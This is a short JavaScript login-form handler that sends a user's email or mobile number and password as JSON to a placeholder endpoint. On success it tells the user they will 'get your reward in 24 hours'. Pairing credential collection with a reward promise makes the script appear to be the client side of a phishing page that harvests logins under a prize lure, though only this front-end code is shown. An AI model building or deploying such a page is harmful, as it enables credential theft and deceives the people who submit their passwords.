document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const emailOrMobile = document.getElementById('emailOrMobile').value;
    const password = document.getElementById('password').value;

    fetch('/your-context-path/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ emailOrMobile, password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Your request has been sent successfully! You\'ll get your reward in 24 hours.');
        } else {
            alert('There was an error processing your request.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
